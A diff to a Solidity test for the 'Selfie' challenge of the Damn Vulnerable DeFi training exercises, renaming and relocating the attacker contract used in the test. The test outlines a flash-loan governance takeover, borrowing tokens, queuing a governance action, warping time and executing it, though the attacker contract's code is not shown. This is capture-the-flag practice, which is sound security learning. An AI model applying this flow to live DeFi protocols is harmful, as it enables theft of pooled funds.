@@ -5,13 +5,12 @@ import "forge-std/Test.sol";
 import "../../src/DamnValuableTokenSnapshot.sol";
 import "../../src/selfie/SelfiePool.sol";
 import "../../src/selfie/SimpleGovernance.sol";
-import "../../src/selfie/Attacker.sol";
+import "../../src/attacker-contracts/SelfieAttacker.sol";
 
 contract SelfieTest is Test {
     DamnValuableTokenSnapshot public token;
     SelfiePool public pool;
     SimpleGovernance public governance;
-    Attacker public attackerContract;
 
     address public deployer = address(1);
     address public attacker = address(2);
@@ -36,7 +35,7 @@ contract SelfieTest is Test {
     function testExploit() public {
         /** YOUR EXPLOIT GOES HERE */
         startHoax(attacker);
-        attackerContract = new Attacker(address(pool), address(governance));
+        SelfieAttacker attackerContract = new SelfieAttacker(address(pool), address(governance));
         attackerContract.executeFlashLoan(TOKENS_IN_POOL);
         vm.warp(block.timestamp + 2 days);
         governance.executeAction(1);
